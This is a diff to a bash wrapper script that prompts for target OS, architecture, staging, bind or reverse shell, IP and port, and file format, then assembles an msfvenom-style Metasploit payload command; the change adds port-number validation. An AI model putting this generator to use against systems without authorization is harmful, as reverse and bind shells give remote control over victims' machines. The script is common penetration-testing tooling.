@@ -1,9 +1,7 @@
 #!/bin/bash
 
-
 echo "What is the operating system of your target? Example: windows, linux, osx"
 read OS
-
 
 correct_os="false"
 
@@ -27,7 +25,6 @@ done
 echo "Is it 64 bit or 32? Please type 32 or 64."
 read architecture
 
-
 correct_arc="false"
 
 validate_arc() {
@@ -47,7 +44,6 @@ do
         validate_arc;
 done
 
-
 no_arc_display(){
 case $OS in
         windows)
@@ -55,7 +51,6 @@ case $OS in
         ;;
 esac
 }
-
 
 meterpreter_question(){
 echo "Would you like to use meterpreter? Please indicate y for yes and n for no."
@@ -82,7 +77,6 @@ done
 
 }
 
-
 linux_x86_meterpreter(){
 case  $OS in
 	linux|windows)
@@ -94,10 +88,8 @@ case  $OS in
 esac
 }
 
-
 echo "Would you like your payload staged or stageless? Please indicate 1 for staged and 2 for stageless"
 read stage
-
 
 correct_stage="false"
 
@@ -118,10 +110,7 @@ do
         validate_stage;
 done
 
-
-
 stage_symbol=""
-
 
 case $stage in
 	1)
@@ -131,7 +120,6 @@ case $stage in
 		stage_symbol="_"
 	;;
 esac
-
 
 case $architecture in
 	32)
@@ -145,7 +133,6 @@ case $architecture in
 		meterpreter_question
 	;;
 esac
-
 
 echo "Would you like to generate a bind shell or reverse shell? Please enter bind or reverse."
 read shell
@@ -169,6 +156,23 @@ do
         validate_shell;
 done
 
+correct_port="false"
+check_port() {
+if [[ $port -gt 65535 ]] || [[ $port -lt 1 ]];
+then
+	echo "$port is not a valid port number. Please choose a number between 1 and 65,535."
+	read port
+else
+	correct_port="true"
+fi
+}
+
+find_correct_port(){
+while [ "${correct_port}" = "false" ];
+do
+	check_port;
+done
+}
 
 
 ip_port=""
@@ -176,19 +180,24 @@ case $shell in
   reverse)
    	echo "Please enter your IP address."
         read ip
+
         echo "Please enter the port you would like to listen on."
         read port
+	check_port
+	find_correct_port
+
 	ip_port="LHOST=$ip LPORT=$port"
     ;;
   bind)
         echo "Please enter your target's IP address."
 	read ip
-	echo "Please enter the remote port."
-	read port
+	echo "Please enter the port you want your target to listen on."
+        read port
+	check_port
+	find_correct_port
 	ip_port="RHOST=$ip RPORT=$port"
     ;;
 esac
-
 
 echo "What would you like the file format to be? Example: exe, raw, pl, rb, c, elf"
 read format
@@ -212,7 +221,6 @@ do
         validate_form;
 done
 
-
 payload=""
 msfgen=""
 
@@ -222,7 +230,6 @@ read filename
 use_meterpreter() {
 	msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} -f $format"
 }
-
 
 no_meterpreter() {
         msfgen="${payload}${stage_symbol}${shell}_tcp ${ip_port} -f $format"
